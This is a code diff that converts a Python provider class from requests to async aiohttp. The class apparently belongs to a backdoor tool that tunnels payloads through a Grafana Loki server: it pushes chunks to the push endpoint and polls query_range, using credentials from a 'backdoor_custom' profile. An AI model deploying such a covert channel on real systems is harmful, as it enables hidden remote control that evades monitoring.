@@ -1,7 +1,7 @@
 import json
 import time
 
-import requests
+import aiohttp
 
 from shameleon_client.profile import Profile
 from shameleon_client.providers.base import ShameleonProvider
@@ -20,7 +20,7 @@ class LokiShameleonProvider(ShameleonProvider):
         super().__init__(profile)
         self._last_log_ts: float = time.time()
 
-    def _send_payload(self, payload: list[str]):
+    async def _send_payload(self, payload: list[str]):
         for i in range(0, len(payload), self._profile.packet_number):
             chunks = payload[i:i + self._profile.packet_number]
             start_ts = time.time_ns() - len(chunks)
@@ -35,15 +35,18 @@ class LokiShameleonProvider(ShameleonProvider):
                     "values": values,
                 }],
             }
-            req = requests.post(
-                f"{self._profile.backdoor_custom['url']}/loki/api/v1/push",
-                json=body,
-                auth=(self._profile.backdoor_custom['user'], self._profile.backdoor_custom['token']),
-                timeout=self._profile.http_timeout,
-            )
-            req.raise_for_status()
+            async with aiohttp.ClientSession(raise_for_status=True) as session:
+                await session.post(
+                    f"{self._profile.backdoor_custom['url']}/loki/api/v1/push",
+                    json=body,
+                    auth=aiohttp.BasicAuth(
+                        self._profile.backdoor_custom['user'],
+                        self._profile.backdoor_custom['token'],
+                    ),
+                    timeout=self._profile.http_timeout,
+                )
 
-    def _get_payload(self) -> list[tuple[str, str]]:
+    async def _get_payload(self) -> list[tuple[str, str]]:
         output: list[tuple[str, str]] = []
         if self._last_log_ts == 0:
             start_time = time.time() - 20
@@ -56,13 +59,18 @@ class LokiShameleonProvider(ShameleonProvider):
             'limit': 1000,
             'direction': 'FORWARD',
         }
-        req = requests.get(
-            f"{self._profile.backdoor_custom['url']}/loki/api/v1/query_range",
-            params=params,
-            auth=(self._profile.backdoor_custom['user'], self._profile.backdoor_custom['token']),
-            timeout=self._profile.http_timeout,
-        )
-        results = req.json()['data']['result']
+        async with aiohttp.ClientSession(raise_for_status=True) as session:
+            async with session.get(
+                f"{self._profile.backdoor_custom['url']}/loki/api/v1/query_range",
+                params=params,
+                auth=aiohttp.BasicAuth(
+                    self._profile.backdoor_custom['user'],
+                    self._profile.backdoor_custom['token'],
+                ),
+                timeout=self._profile.http_timeout,
+            ) as req:
+                data = await req.json()
+                results = data['data']['result']
         if len(results) == 0:
             return output
         for value in results[0]['values']:
